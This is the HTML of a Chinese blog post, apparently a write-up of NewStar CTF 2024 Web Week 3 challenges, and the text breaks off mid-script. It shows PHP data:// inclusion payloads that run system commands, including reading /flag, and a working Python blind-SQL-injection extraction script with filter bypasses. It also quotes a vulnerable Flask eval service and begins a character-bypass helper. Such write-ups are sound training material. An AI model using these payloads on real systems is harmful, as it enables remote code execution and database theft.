@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Huaji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Huaji">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    <meta name="description" content="搞到现在总算有个博客了">
+    <meta name="description" content="NewStar CTF 2024 Web Week3复现平台链接https:&#x2F;&#x2F;ctf.xidian.edu.cn&#x2F;training&#x2F;14 紧跟上次week1和week2的题目 写于7.18和7.19 include me1234567891011121314151617181920&lt;?phphighlight_file(__FILE__);function waf()&#123;    i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NewStar CTF 2024 Web Week3复现">
+<meta property="og:url" content="http://huajihd.github.io/2025/07/20/NewStar-CTF-2024-Web-Week3/index.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="NewStar CTF 2024 Web Week3复现平台链接https:&#x2F;&#x2F;ctf.xidian.edu.cn&#x2F;training&#x2F;14 紧跟上次week1和week2的题目 写于7.18和7.19 include me1234567891011121314151617181920&lt;?phphighlight_file(__FILE__);function waf()&#123;    i">
+<meta property="og:locale">
+<meta property="article:published_time" content="2025-07-19T16:12:49.000Z">
+<meta property="article:modified_time" content="2025-07-19T16:13:38.059Z">
+<meta property="article:author" content="Huaji">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    <title>NewStar CTF 2024 Web Week3复现 · Huajiの小窝</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">Huajiの小窝.</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">Huajiの小窝.</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">NewStar CTF 2024 Web Week3复现</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                NewStar CTF 2024 Web Week3复现
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+</div>
+
+                <!-- 文章字数统计 -->
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2025/07/20</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="NewStar-CTF-2024-Web-Week3复现"><a href="#NewStar-CTF-2024-Web-Week3复现" class="headerlink" title="NewStar CTF 2024 Web Week3复现"></a>NewStar CTF 2024 Web Week3复现</h1><p>平台链接<a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/14">https://ctf.xidian.edu.cn/training/14</a></p>
+<p>紧跟上次week1和week2的题目</p>
+<p>写于7.18和7.19</p>
+<h3 id="include-me"><a href="#include-me" class="headerlink" title="include me"></a>include me</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&lt;|\?|php|&gt;|echo|filter|flag|system|file|%|&amp;|=|`|eval/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;me&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;兄弟你别包&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//兄弟你知道了吗？</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;iknow&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Refresh: 5;url=https://cn.bing.com/search?q=php%E4%BC%AA%E5%8D%8F%E8%AE%AE&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">waf</span>();</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;me&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;兄弟你好香&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>很容易看出来这是data伪协议的题，所以用base64编码一次，此处注意加<strong>号需要编码成%2B</strong>，不然会被解析为空格，等号则不能出现在base编码里面，所以后面添上无关信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:48254?iknow=1&amp;me=data://text/plain;base64,PD89IHN5c3RlbSgnbHMnKTs/PjEy</span><br><span class="line">http://127.0.0.1:48254?iknow=1&amp;me=data://text/plain;base64,PD89IHN5c3RlbSgnbHMgLycpOz8%2BPT09</span><br><span class="line">http://127.0.0.1:48254?iknow=1&amp;me=data://text/plain;base64,PD89IHN5c3RlbSgnY2F0IC9mbGFnJyk7Pz49</span><br></pre></td></tr></table></figure>
+
+<h3 id="blindsql1"><a href="#blindsql1" class="headerlink" title="blindsql1"></a>blindsql1</h3><p>如题，考的盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:48254/?student_name=Charlie&#x27;||1%23</span><br></pre></td></tr></table></figure>
+
+<p>过滤了空格，&#x2F;，&#x3D;，substr</p>
+<p>&#x3D;用like代替</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://127.0.0.1:48254/?student_name=&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">charset=string.ascii_lowercase+string.digits+<span class="string">&quot;-_!&#123;&#125;?&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    bottom=<span class="number">43</span></span><br><span class="line">    <span class="keyword">while</span> bottom&lt;top:</span><br><span class="line">        mid=(top+bottom)//<span class="number">2</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mid=&quot;</span>,mid)</span><br><span class="line">        payload1=<span class="string">r&#x27;&#x27;&#x27;Charlie&#x27;%26%26if(ord(mid(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        payload2=<span class="string">r&#x27;&#x27;&#x27;Charlie&#x27;%26%26if(ord(mid((select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        payload3=<span class="string">r&#x27;&#x27;&#x27;Charlie&#x27;%26%26if(ord(mid((select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#x27;secrets&#x27;))),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        payload4=<span class="string">r&#x27;&#x27;&#x27;Charlie&#x27;%26%26if(ord(mid((select(group_concat(secret_value))from(secrets)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        r=requests.get(url+payload4)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;English&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            bottom=mid+<span class="number">1</span></span><br><span class="line">            <span class="comment">#print(&quot;bottom=&quot;,bottom)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            top=mid</span><br><span class="line">            <span class="comment">#print(&quot;top=&quot;,top)</span></span><br><span class="line">    <span class="keyword">if</span> top==<span class="number">43</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        <span class="comment">#break</span></span><br><span class="line">    flag+=<span class="built_in">chr</span>(top)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>+flag)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="臭皮的计算机"><a href="#臭皮的计算机" class="headerlink" title="臭皮的计算机"></a>臭皮的计算机</h3><p>根据提示访问calc，源代码贴在下面了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    token = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>:</span><br><span class="line">            token = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        num = request.form.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">        script = <span class="string">f&#x27;&#x27;&#x27;import os</span></span><br><span class="line"><span class="string">print(eval(&quot;<span class="subst">&#123;num&#125;</span>&quot;))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(script)</span><br><span class="line">        <span class="keyword">if</span> waf(num):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result_output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">with</span> tempfile.NamedTemporaryFile(mode=<span class="string">&#x27;w+&#x27;</span>, suffix=<span class="string">&#x27;.py&#x27;</span>, delete=<span class="literal">False</span>) <span class="keyword">as</span> temp_script:</span><br><span class="line">                    temp_script.write(script)</span><br><span class="line">                    temp_script_path = temp_script.name</span><br><span class="line"></span><br><span class="line">                result = subprocess.run([<span class="string">&#x27;python3&#x27;</span>, temp_script_path], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">                os.remove(temp_script_path)</span><br><span class="line"></span><br><span class="line">                result_output = result.stdout <span class="keyword">if</span> result.returncode == <span class="number">0</span> <span class="keyword">else</span> result.stderr</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">                result_output = <span class="built_in">str</span>(e)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;calc.html&quot;</span>, result=result_output)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;calc.html&quot;</span>, result=<span class="string">&quot;臭皮！你想干什么！！&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;calc.html&quot;</span>, result=<span class="string">&#x27;试试呗&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">30002</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里要用全角的字符，但是不知道为什么斜体不能直接做，要用chr把数字转成文字</p>
+<p>先附上一个自动转斜体的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数学斜体字母 (Unicode)</span></span><br><span class="line">italic_map = &#123;</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;𝒂&#x27;</span>, <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;𝒃&#x27;</span>, <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;𝒄&#x27;</span>, <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;𝒅&#x27;</span>, <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;𝒆&#x27;</span>, <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;𝒇&#x27;</span>, <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;𝒈&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;𝒉&#x27;</span>, <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;𝒊&#x27;</span>, <span class="string">&#x27;j&#x27;</span>: <span class="string">&#x27;𝒋&#x27;</span>, <span class="string">&#x27;k&#x27;</span>: <span class="string">&#x27;𝒌&#x27;</span>, <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;𝒍&#x27;</span>, <span class="string">&#x27;m&#x27;</span>: <span class="string">&#x27;𝒎&#x27;</span>, <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;𝒏&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;𝒐&#x27;</span>, <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;𝒑&#x27;</span>, <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;𝒒&#x27;</span>, <span class="string">&#x27;r&#x27;</span>: <span class="string">&#x27;𝒓&#x27;</span>, <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;𝒔&#x27;</span>, <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;𝒕&#x27;</span>, <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;𝒖&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;𝒗&#x27;</span>, <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;𝒘&#x27;</span>, <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;𝒙&#x27;</span>, <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;𝒚&#x27;</span>, <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;𝒛&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;𝑨&#x27;</span>, <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;𝑩&#x27;</span>, <span 